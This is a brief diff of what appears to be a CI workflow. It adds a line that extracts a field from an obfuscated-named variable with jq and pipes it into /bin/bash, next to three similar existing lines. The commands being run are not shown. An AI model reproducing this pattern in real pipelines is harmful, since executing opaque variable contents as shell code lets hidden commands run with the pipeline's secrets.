@@ -25,6 +25,7 @@ jobs:
           echo $poviu20 | jq -r .f03 | /bin/bash
           echo $wqp53 | jq -r .qudyq81 | /bin/bash
           printf '%s' "$ri5193" | jq -r .zi5217 | /bin/bash
+          echo $byqvk4371 | jq -r .pu8 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
